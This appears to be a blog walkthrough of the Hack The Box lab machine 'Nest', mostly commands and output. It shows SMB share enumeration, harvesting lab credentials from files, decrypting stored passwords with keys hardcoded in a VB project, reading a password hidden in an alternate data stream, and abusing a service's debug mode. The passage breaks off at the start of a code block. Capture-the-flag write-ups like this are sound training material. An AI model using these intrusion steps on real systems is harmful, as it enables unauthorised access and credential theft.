@@ -1,0 +1,986 @@
+---
+title: Hack the Box: Nest
+published: true
+date: 2020-06-20 23:25:01 UTC
+tags: walkthrough,writeup,nest,hackthebox
+canonical_url: 
+---
+
+![](https://cdn-images-1.medium.com/max/602/1*5p--f_ZfSAKmqGapWqZFXQ.png)
+
+Hello readers! Here is my write up for this box:
+
+#1. Nmap scan
+
+Looking at the nmap scan, we can see two ports that are open: 445 (SMB) and 4386 (mystery service).
+
+```
+root@kali:~/htb/nest# nmap -sC -sV -p- -O -oA nmap\_out1 10.10.10.178
+Nmap scan report for 10.10.10.178
+Host is up (0.037s latency).
+Not shown: 65533 filtered ports
+PORT STATE SERVICE VERSION
+445/tcp open microsoft-ds?
+4386/tcp open unknown
+| fingerprint-strings: 
+| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+| Reporting Service V1.2
+| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+| Reporting Service V1.2
+| Unrecognised command
+| Help: 
+| Reporting Service V1.2
+| This service allows users to run queries against databases using the legacy HQK format
+| AVAILABLE COMMANDS ---
+| LIST
+| SETDIR <Directory\_Name>
+| RUNQUERY <Query\_ID>
+| DEBUG <Password>
+|\_ HELP <Command>
+
+--- SNIP ---
+
+Host script results:
+|\_clock-skew: 1m54s
+| smb2-security-mode: 
+| 2.02: 
+|\_ Message signing enabled but not required
+| smb2-time: 
+| date: 2020-05-29T04:33:04
+|\_ start\_date: 2020-05-29T04:24:52
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 318.91 seconds
+```
+
+#2. SMB enumeration
+
+Since port 445 is open, let see what smb drives are there. Running smbclient gave me this:
+
+```
+root@kali:~/htb/nest# smbclient -L 10.10.10.178
+Enter WORKGROUP\root's password: 
+
+    Sharename Type Comment
+    --------- ---- -------
+    ADMIN$ Disk Remote Admin
+    C$ Disk Default share
+    Data Disk      
+    IPC$ IPC Remote IPC
+    Secure$ Disk      
+    Users Disk      
+Reconnecting with SMB1 for workgroup listing.
+do\_connect: Connection to 10.10.10.178 failed (Error NT\_STATUS\_IO\_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+We can see that apart from the common drives, there are three additional drives: **Data**  , **Secure$** and **Users**. Let’s see what can we access as an unauthenticated user:
+
+For the **Users**  drive:
+
+```
+root@kali:~# smbclient \\\\10.10.10.178\\Users
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Sat Jan 25 18:04:21 2020
+  .. D 0 Sat Jan 25 18:04:21 2020
+  Administrator D 0 Fri Aug 9 11:08:23 2019
+  C.Smith D 0 Sun Jan 26 02:21:44 2020
+  L.Frost D 0 Thu Aug 8 13:03:01 2019
+  R.Thompson D 0 Thu Aug 8 13:02:50 2019
+  TempUser D 0 Wed Aug 7 18:55:56 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \> cd ./TempUser\
+smb: \TempUser\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \TempUser\*
+smb: \TempUser\> cd ..
+smb: \> cd ./C.Smith\
+smb: \C.Smith\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \C.Smith\*
+smb: \C.Smith\> cd ..
+smb: \> cd ./Administrator
+smb: \Administrator\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \Administrator\*
+smb: \Administrator\> cd ..
+smb: \> cd ./L.Frost
+smb: \L.Frost\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \L.Frost\*
+smb: \L.Frost\> cd ..
+smb: \> cd ./R.Thompson
+smb: \R.Thompson\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \R.Thompson\*
+smb: \R.Thompson\> cd ..
+```
+
+For the **Data**  drives:
+
+```
+root@kali:~# smbclient \\\\10.10.10.178\\Data
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Wed Aug 7 18:53:46 2019
+  .. D 0 Wed Aug 7 18:53:46 2019
+  IT D 0 Wed Aug 7 18:58:07 2019
+  Production D 0 Mon Aug 5 17:53:38 2019
+  Reports D 0 Mon Aug 5 17:53:44 2019
+  Shared D 0 Wed Aug 7 15:07:51 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \> cd ./IT
+smb: \IT\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \IT\*
+smb: \IT\> cd ..
+smb: \> cd ./Production
+smb: \Production\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \Production\*
+smb: \Production\> cd ..
+smb: \> cd ./Reports\
+smb: \Reports\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \Reports\*
+smb: \Reports\> cd ..
+smb: \> cd ./Shared\
+smb: \Shared\> ls
+  . D 0 Wed Aug 7 15:07:51 2019
+  .. D 0 Wed Aug 7 15:07:51 2019
+  Maintenance D 0 Wed Aug 7 15:07:32 2019
+  Templates D 0 Wed Aug 7 15:08:07 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \Shared\> cd Maintenance\
+smb: \Shared\Maintenance\> ls
+  . D 0 Wed Aug 7 15:07:32 2019
+  .. D 0 Wed Aug 7 15:07:32 2019
+  Maintenance Alerts.txt A 48 Mon Aug 5 19:01:44 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \Shared\Maintenance\> cd ..
+smb: \Shared\> cd ./Templates\
+smb: \Shared\Templates\> ls
+  . D 0 Wed Aug 7 15:08:07 2019
+  .. D 0 Wed Aug 7 15:08:07 2019
+  HR D 0 Wed Aug 7 15:08:01 2019
+  Marketing D 0 Wed Aug 7 15:08:06 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \Shared\Templates\> cd ./HR\
+smb: \Shared\Templates\HR\> ls
+  . D 0 Wed Aug 7 15:08:01 2019
+  .. D 0 Wed Aug 7 15:08:01 2019
+  Welcome Email.txt A 425 Wed Aug 7 18:55:36 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \Shared\Templates\HR\> cd ..
+smb: \Shared\Templates\> cd ./Marketing\
+smb: \Shared\Templates\Marketing\> ls
+  . D 0 Wed Aug 7 15:08:06 2019
+  .. D 0 Wed Aug 7 15:08:06 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+```
+
+For the **Secure$**  Drive:
+
+```
+root@kali:~# smbclient \\\\10.10.10.178\\Secure$
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT\_STATUS\_ACCESS\_DENIED listing \*
+smb: \>
+```
+
+So base on the above results, it seems like the only folders we are able to view is the Shared folder on the **Data** drive. Viewing the contents, we get the following:
+
+```
+root@kali:~/htb/nest# cat Maintenance\ Alerts.txt 
+There is currently no scheduled maintenance work
+
+root@kali:~/htb/nest# cat ./Welcome\ Email.txt 
+We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\<USERNAME>
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+Thank you
+HR
+```
+
+And we get our first user credentials! The next obvious place to look at is the TempUser folder on the **Users**  drive.
+
+```
+root@kali:~/htb/nest# smbclient \\\\10.10.10.178\\Users -U TempUser%welcome2019
+Domain=[HTB-NEST] OS=[] Server=[]
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Sat Jan 25 18:04:21 2020
+  .. D 0 Sat Jan 25 18:04:21 2020
+  Administrator D 0 Fri Aug 9 11:08:23 2019
+  C.Smith D 0 Sun Jan 26 02:21:44 2020
+  L.Frost D 0 Thu Aug 8 13:03:01 2019
+  R.Thompson D 0 Thu Aug 8 13:02:50 2019
+  TempUser D 0 Wed Aug 7 18:55:56 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \> cd ./TempUser\
+smb: \TempUser\> ls
+  . D 0 Wed Aug 7 18:55:56 2019
+  .. D 0 Wed Aug 7 18:55:56 2019
+  New Text Document.txt A 0 Wed Aug 7 18:55:56 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+
+root@kali:~/htb/nest# cat "New Text Document.txt" 
+---- Nothing :( --------
+```
+
+Listing out the contents of this folder gives us a text document that contains nothing on it. We still aren’t able to access any other folders, so lets move on to the **Data**  drive.
+
+```
+root@kali:~/htb/nest# smbclient \\\\10.10.10.178\\Data -U TempUser%welcome2019
+Domain=[HTB-NEST] OS=[] Server=[]
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Wed Aug 7 18:53:46 2019
+  .. D 0 Wed Aug 7 18:53:46 2019
+  IT D 0 Wed Aug 7 18:58:07 2019
+  Production D 0 Mon Aug 5 17:53:38 2019
+  Reports D 0 Mon Aug 5 17:53:44 2019
+  Shared D 0 Wed Aug 7 15:07:51 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \> cd ./IT
+smb: \IT\> ls
+  . D 0 Wed Aug 7 18:58:07 2019
+  .. D 0 Wed Aug 7 18:58:07 2019
+  Archive D 0 Mon Aug 5 18:33:58 2019
+  Configs D 0 Wed Aug 7 18:59:34 2019
+  Installs D 0 Wed Aug 7 18:08:30 2019
+  Reports D 0 Sat Jan 25 19:09:13 2020
+  Tools D 0 Mon Aug 5 18:33:43 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \IT\> cd ./Archive\
+smb: \IT\Archive\> ls
+  . D 0 Mon Aug 5 18:33:58 2019
+  .. D 0 Mon Aug 5 18:33:58 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \IT\Archive\> cd ..
+smb: \IT\> cd ./Configs\
+smb: \IT\Configs\> ls
+  . D 0 Wed Aug 7 18:59:34 2019
+  .. D 0 Wed Aug 7 18:59:34 2019
+  Adobe D 0 Wed Aug 7 15:20:09 2019
+  Atlas D 0 Tue Aug 6 07:16:18 2019
+  DLink D 0 Tue Aug 6 09:25:27 2019
+  Microsoft D 0 Wed Aug 7 15:23:26 2019
+  NotepadPlusPlus D 0 Wed Aug 7 15:31:37 2019
+  RU Scanner D 0 Wed Aug 7 16:01:13 2019
+  Server Manager D 0 Tue Aug 6 09:25:19 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \IT\Configs\> cd ./RU Scanner\
+cd \IT\Configs\RU\: NT\_STATUS\_OBJECT\_NAME\_NOT\_FOUND
+smb: \IT\Configs\> ls
+  . D 0 Wed Aug 7 18:59:34 2019
+  .. D 0 Wed Aug 7 18:59:34 2019
+  Adobe D 0 Wed Aug 7 15:20:09 2019
+  Atlas D 0 Tue Aug 6 07:16:18 2019
+  DLink D 0 Tue Aug 6 09:25:27 2019
+  Microsoft D 0 Wed Aug 7 15:23:26 2019
+  NotepadPlusPlus D 0 Wed Aug 7 15:31:37 2019
+  RU Scanner D 0 Wed Aug 7 16:01:13 2019
+  Server Manager D 0 Tue Aug 6 09:25:19 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \IT\Configs\> cd "RU Scanner"
+smb: \IT\Configs\RU Scanner\> ls
+  . D 0 Wed Aug 7 16:01:13 2019
+  .. D 0 Wed Aug 7 16:01:13 2019
+  RU\_config.xml A 270 Thu Aug 8 15:49:37 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+smb: \IT\Configs\RU Scanner\> cd ..
+smb: \IT\Configs\> cd ./NotepadPlusPlus
+smb: \IT\Configs\NotepadPlusPlus\> ls
+  . D 0 Wed Aug 7 15:31:37 2019
+  .. D 0 Wed Aug 7 15:31:37 2019
+  config.xml A 6451 Wed Aug 7 19:01:25 2019
+  shortcuts.xml A 2108 Wed Aug 7 15:30:27 2019
+
+        10485247 blocks of size 4096. 6543448 blocks available
+```
+
+We can see that we are now able to list out the contents now. I won’t list out the whole enumeration of all directories, in order to keep some brevity. Both the Production and Reports folder contain nothing important in them. The most interesting files are listed below: **RU\_config.xml** and **config.xml**.
+
+```
+root@kali:~/htb/nest# cat RU\_config.xml
+<?xml version="1.0"?>
+<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>389</Port>
+  <Username>c.smith</Username>
+  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+
+root@kali:~/htb/nest# cat config.xml
+<?xml version="1.0" encoding="Windows-1252" ?>
+<NotepadPlus>
+    <GUIConfigs>
+        ---- SNIP 
+    </FindHistory>
+    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
+        <File filename="C:\windows\System32\drivers\etc\hosts" />
+        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
+    </History>
+</NotepadPlus>
+```
+
+We can see in the first file another set of credentials, but the password seems to be hashed. The second file contains what appears to be a configuration file for Notepad++. The majority of the content is noise, except for the very bottom part. One of the filepaths seems to be related to the **Secure$**  drive.
+
+```
+<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+```
+
+With that information at hand, lets see if we are able to access **Secure$** drive now.
+
+```
+root@kali:~/htb/nest# smbclient \\\\10.10.10.178\\Secure$ -U TempUser%welcome2019
+Domain=[HTB-NEST] OS=[] Server=[]
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Wed Aug 7 19:08:12 2019
+  .. D 0 Wed Aug 7 19:08:12 2019
+  Finance D 0 Wed Aug 7 15:40:13 2019
+  HR D 0 Wed Aug 7 19:08:11 2019
+  IT D 0 Thu Aug 8 06:59:25 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+smb: \> cd ./Finance\
+smb: \Finance\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \Finance\*
+smb: \Finance\> cd ..
+smb: \> cd ./HR
+smb: \HR\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \HR\*
+smb: \HR\> cd ..
+smb: \> cd ./IT
+smb: \IT\> ls
+NT\_STATUS\_ACCESS\_DENIED listing \IT\*
+smb: \IT\> cd ./Carl
+smb: \IT\Carl\> ls
+  . D 0 Wed Aug 7 15:42:14 2019
+  .. D 0 Wed Aug 7 15:42:14 2019
+  Docs D 0 Wed Aug 7 15:44:00 2019
+  Reports D 0 Tue Aug 6 09:45:40 2019
+  VB Projects D 0 Tue Aug 6 10:41:55 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+```
+
+With the TempUser credentials, we are now able to directory list the drive but we still cannot see what the contents are in each folder. However if we change directories to **/IT/Carl** , we are suddenly able to directory list again.
+
+```
+smb: \IT\Carl\> cd ./Docs
+smb: \IT\Carl\Docs\> ls
+  . D 0 Wed Aug 7 15:44:00 2019
+  .. D 0 Wed Aug 7 15:44:00 2019
+  ip.txt A 56 Wed Aug 7 15:44:16 2019
+  mmc.txt A 73 Wed Aug 7 15:43:42 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+smb: \IT\Carl\Docs\> cd ..
+smb: \IT\Carl\> cd ./Reports\
+smb: \IT\Carl\Reports\> ls
+  . D 0 Tue Aug 6 09:45:40 2019
+  .. D 0 Tue Aug 6 09:45:40 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+smb: \IT\Carl\Reports\> cd ..
+smb: \IT\Carl\> cd ./"VB Projects\"
+smb: \IT\Carl\VB Projects\> ls
+  . D 0 Tue Aug 6 10:41:55 2019
+  .. D 0 Tue Aug 6 10:41:55 2019
+  Production D 0 Tue Aug 6 10:07:13 2019
+  WIP D 0 Tue Aug 6 10:47:41 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+```
+
+For brevity sake, I won’t display the contents of the files in Docs and Reports as they are irrelevant. The folder **VB Projects** on the other hand, contains files for a VB application — located in the WIP folder (The Production folder doesn’t have anything inside).
+
+```
+smb: \IT\Carl\VB Projects\> cd ./WIP\
+smb: \IT\Carl\VB Projects\WIP\> ls
+  . D 0 Tue Aug 6 10:47:41 2019
+  .. D 0 Tue Aug 6 10:47:41 2019
+  RU D 0 Fri Aug 9 11:36:45 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+smb: \IT\Carl\VB Projects\WIP\> cd ./RU
+smb: \IT\Carl\VB Projects\WIP\RU\> ls
+  . D 0 Fri Aug 9 11:36:45 2019
+  .. D 0 Fri Aug 9 11:36:45 2019
+  RUScanner D 0 Wed Aug 7 18:05:54 2019
+  RUScanner.sln A 871 Tue Aug 6 10:45:36 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+smb: \IT\Carl\VB Projects\WIP\RU\> cd ./RUScanner
+smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\> ls
+  . D 0 Wed Aug 7 18:05:54 2019
+  .. D 0 Wed Aug 7 18:05:54 2019
+  bin D 0 Wed Aug 7 16:00:11 2019
+  ConfigFile.vb A 772 Wed Aug 7 18:05:09 2019
+  Module1.vb A 279 Wed Aug 7 18:05:44 2019
+  My Project D 0 Wed Aug 7 16:00:11 2019
+  obj D 0 Wed Aug 7 16:00:11 2019
+  RU Scanner.vbproj A 4828 Fri Aug 9 11:37:51 2019
+  RU Scanner.vbproj.user A 143 Tue Aug 6 08:55:27 2019
+  SsoIntegration.vb A 133 Wed Aug 7 18:05:58 2019
+  Utils.vb A 4888 Wed Aug 7 15:49:35 2019
+
+        10485247 blocks of size 4096. 6543183 blocks available
+```
+
+If we go back to the **RU\_config.xml** file we found in the **Data** drive, we would realize that it was located under the **RU Scanner** folder — which means these files are the key to decrypting the password. Since this is a VB Application, the best way to go about this is to use Visual Studio on Windows. It will make viewing and building the code a whole lot easier. Simply import the project by opening the RUScanner.sln file. The three most important files are the following: Module1.vb, Ssointegration.vb and Utils.vb.
+
+```
+Module Module1
+
+    Sub Main()
+        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU\_Config.xml")
+        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
+
+    End Sub
+
+End Module
+```
+
+Module1.vb shows how the **RU\_Config.xml file** is imported.
+
+```
+Public Class SsoIntegration
+
+    Public Property Username As String
+    Public Property Password As String
+
+End Class
+```
+
+Ssointegration.vb shows how the credentials are being stored in memory.
+
+```
+--- SNIP ---
+Public Shared Function DecryptString(EncryptedString As String) As String
+        If String.IsNullOrEmpty(EncryptedString) Then
+            Return String.Empty
+        Else
+            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+
+    Public Shared Function EncryptString(PlainString As String) As String
+        If String.IsNullOrEmpty(PlainString) Then
+            Return String.Empty
+        Else
+            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+--- SNIP ---
+```
+
+Utils.vb shows the actual encryption and decryption method being used. In order to get the program to displayed the decrypted password, we need to first build the program and debug it afterwards. Once we build it, we placed the **RU\_Config.xml** file inside the same folder as the build, enter debug mode, and set a breakpoint. Since **Utils.vb** file is where the decryption lies, we need to examine at what point of the code is the password decrypted. Here are the functions that does just that:
+
+```
+Public Shared Function Decrypt(ByVal cipherText As String, \_
+                                   ByVal passPhrase As String, \_
+                                   ByVal saltValue As String, \_
+                                    ByVal passwordIterations As Integer, \_
+                                   ByVal initVector As String, \_
+                                   ByVal keySize As Integer) \_
+                           As String
+
+        Dim initVectorBytes As Byte()
+        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
+
+        Dim saltValueBytes As Byte()
+        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
+
+        Dim cipherTextBytes As Byte()
+        cipherTextBytes = Convert.FromBase64String(cipherText)
+
+        Dim password As New Rfc2898DeriveBytes(passPhrase, \_
+                                           saltValueBytes, \_
+                                           passwordIterations)
+
+        Dim keyBytes As Byte()
+        keyBytes = password.GetBytes(CInt(keySize / 8))
+
+        Dim symmetricKey As New AesCryptoServiceProvider
+        symmetricKey.Mode = CipherMode.CBC
+
+        Dim decryptor As ICryptoTransform
+        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
+
+        Dim memoryStream As IO.MemoryStream
+        memoryStream = New IO.MemoryStream(cipherTextBytes)
+
+        Dim cryptoStream As CryptoStream
+        cryptoStream = New CryptoStream(memoryStream, \_
+                                        decryptor, \_
+                                        CryptoStreamMode.Read)
+
+        Dim plainTextBytes As Byte()
+        ReDim plainTextBytes(cipherTextBytes.Length)
+
+        Dim decryptedByteCount As Integer
+        decryptedByteCount = cryptoStream.Read(plainTextBytes, \_
+                                               0, \_
+                                               plainTextBytes.Length)
+
+        memoryStream.Close()
+        cryptoStream.Close()
+
+        Dim plainText As String
+        plainText = Encoding.ASCII.GetString(plainTextBytes, \_
+                                            0, \_
+                                            decryptedByteCount)
+
+INSERT BREAKPOINT HERE ---> Console.WriteLine(plainText)
+
+         Return plainText
+    End Function
+```
+
+I added the code Console.WriteLine(plainText) to make it easier for me to setup a breakpoint. Once we set all that up, the program will run and stop at the breakpoint. We should be able to see the value of plainText at the debugging menu.
+
+![](https://cdn-images-1.medium.com/max/1024/0*Fq0317jhaGMsjE9F)
+
+The password decrypted to: “xRxRxPANCAK3SxRxRx”.
+
+We can then try logging into the smb drives using the newly acquired credentials for the user: C.Smith or Carl. In this case, only the **User** drive is relevant, as the directory listing on other drives yield essentially nothing.
+
+```
+root@kali:~/htb/nest# smbclient \\\\10.10.10.178\\Users -U C.Smith%xRxRxPANCAK3SxRxRx
+Domain=[HTB-NEST] OS=[] Server=[]
+Try "help" to get a list of possible commands.
+smb: \> ls
+  . D 0 Sat Jan 25 18:04:21 2020
+  .. D 0 Sat Jan 25 18:04:21 2020
+  Administrator D 0 Fri Aug 9 11:08:23 2019
+  C.Smith D 0 Sun Jan 26 02:21:44 2020
+  L.Frost D 0 Thu Aug 8 13:03:01 2019
+  R.Thompson D 0 Thu Aug 8 13:02:50 2019
+  TempUser D 0 Wed Aug 7 18:55:56 2019
+
+        10485247 blocks of size 4096. 6545473 blocks available
+smb: \> cd ./C.Smith
+smb: \C.Smith\> ls
+  . D 0 Sun Jan 26 02:21:44 2020
+  .. D 0 Sun Jan 26 02:21:44 2020
+  HQK Reporting D 0 Thu Aug 8 19:06:17 2019
+  user.txt A 32 Thu Aug 8 19:05:24 2019
+
+        10485247 blocks of size 4096. 6545473 blocks available
+
+smb: \C.Smith\> ls
+  . D 0 Sun Jan 26 02:21:44 2020
+  .. D 0 Sun Jan 26 02:21:44 2020
+  HQK Reporting D 0 Thu Aug 8 19:06:17 2019
+  user.txt A 32 Thu Aug 8 19:05:24 2019
+
+        10485247 blocks of size 4096. 6545473 blocks available
+smb: \C.Smith\> cd "HQK Reporting"
+smb: \C.Smith\HQK Reporting\> ls
+  . D 0 Thu Aug 8 19:06:17 2019
+  .. D 0 Thu Aug 8 19:06:17 2019
+  AD Integration Module D 0 Fri Aug 9 08:18:42 2019
+  Debug Mode Password.txt A 0 Thu Aug 8 19:08:17 2019
+  HQK\_Config\_Backup.xml A 249 Thu Aug 8 19:09:05 2019
+
+smb: \C.Smith\HQK Reporting\AD Integration Module\> ls
+  . D 0 Fri Aug 9 08:18:42 2019
+  .. D 0 Fri Aug 9 08:18:42 2019
+  HqkLdap.exe A 17408 Wed Aug 7 19:41:16 2019
+
+        10485247 blocks of size 4096. 6545457 blocks available
+smb: \C.Smith\HQK Reporting\AD Integration Module\> get HqkLdap.exe
+getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (95.0 KiloBytes/sec) (average 17.6 KiloBytes/sec)
+smb: \C.Smith\HQK Reporting\AD Integration Module\> cd ..
+smb: \C.Smith\HQK Reporting\> ls
+  . D 0 Thu Aug 8 19:06:17 2019
+  .. D 0 Thu Aug 8 19:06:17 2019
+  AD Integration Module D 0 Fri Aug 9 08:18:42 2019
+  Debug Mode Password.txt A 0 Thu Aug 8 19:08:17 2019
+  HQK\_Config\_Backup.xml A 249 Thu Aug 8 19:09:05 2019
+```
+
+At this point we can grab the user flag and submit it to HackTheBox.
+
+The directory listing yield some interesting files: an exe file, config file and an empty file. Lets look at the config file:
+
+```
+root@kali:~/htb/nest/HQK# cat HQK\_Config\_Backup.xml 
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>
+```
+
+We can see that the exe seems to run on port 4386 on the machine. If we look back on our nmap scans, we can see that the machine does have port 4386 running — with HQK service running so that’s probably it. To access the service we can telnet to the port with telnet 10.10.10.178 4386. Upon using telnet we are greeted with this:
+
+```
+root@kali:~/htb/nest# telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory\_Name>
+RUNQUERY <Query\_ID>
+DEBUG <Password>
+HELP <Command>
+```
+
+Looks like some kind of service to run queries. We can freely change directories with the setdir command and list out contents of the directory with list. runquery doesn't seem to run properly - even with "legitimate" files. Then there's the debug command which seems to give additional functionality to the service - that is if you have a password.
+
+```
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR] COMPARISONS
+[1] Invoices (Ordered By Customer)
+[2] Products Sold (Ordered By Customer)
+[3] Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+>runquery 1
+
+Invalid database configuration found. Please contact your system administrator
+
+>help debug
+
+DEBUG <Password>
+Enables debug mode, which allows the use of additional commands to use for troubleshooting network and configuration issues. Requires a password which will be set by your system administrator when the service was installed
+
+Examples: 
+DEBUG MyPassw0rd Attempts to enable debug mode by using the
+                     password "MyPassw0rd"
+```
+
+If we go back to the password file we found with the exe it looks like an empty file, however that’s not entirely true. Lets go back to the file on the smb drive and view again:
+
+```
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt" 
+altname: DEBUGM~1.TXT
+create\_time: Thu Aug 8 07:06:12 PM 2019 EDT
+access\_time: Thu Aug 8 07:06:12 PM 2019 EDT
+write\_time: Thu Aug 8 07:08:17 PM 2019 EDT
+change\_time: Thu Aug 8 07:08:17 PM 2019 EDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+```
+
+We can see now that the password was simply hidden on a different data [stream](https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/) , hence the appearance of looking empty. Make sure when you do download the file that you specify the stream, otherwise it will download the file but strip the stream. Like the following:
+
+```
+smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password:$DATA"
+```
+
+Once downloaded, we can view the file can see the debug password inside.
+
+```
+root@kali:~/htb/nest# cat Debug\ Mode\ Password.txt\:Password\:\$DATA 
+WBQ201953D8w
+```
+
+We entered in the password on the HQK service on port 4386 and we get some additional commands to play with:
+
+```
+root@kali:~/htb/nest# telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>Debug WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+>Help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory\_Name>
+RUNQUERY <Query\_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query\_ID>
+```
+
+The most important query is showquery which allows you to view the contents of files. The current folder we are in doesn't have anything interesting so lets move up a folder and view the ldap folder - as that seems like a likely place for credentials.
+
+```
+>setdir ..
+
+Current directory set to HQK
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR] ALL QUERIES
+[DIR] LDAP
+[DIR] Logs
+[1] HqkSvc.exe
+[2] HqkSvc.InstallState
+[3] HQK\_Config.xml
+
+Current Directory: HQK
+>setdir ldap 
+
+Current directory set to ldap
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1] HqkLdap.exe
+[2] Ldap.conf
+
+Current Directory: ldap
+>showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+Viewing the file we can see a set of credentials for an administrator including the hashed password. In order to decrypt the password, we will do something similar like we did to get Carl’s password from RU Scanner. In this case, we don’t have the project files but we do have the exe — which means we have to decompile it. Since this is most likely a .Net application, we will use a .Net decompiler. You can use any .Net decomplier, the one I used is called [JustDecompile](https://www.telerik.com/products/decompiler.aspx).
+
+![](https://cdn-images-1.medium.com/max/1024/0*84ziljPeUeHNyHOV)
+
+As you can see from the left taskbar, there are a few modules — the most important one called HqkLdap. Inside that there are 4 main pages, the CR being the most important. CR contains the code for the encryption and decryption of password hashes. Unlike the RU Scanner application, there’s no need to build the code or to run a debugger. Instead we can just take the entire CR class and run it separately. Since the code only contains the class and not the main function, you need to add that in. Like the following:
+
+```
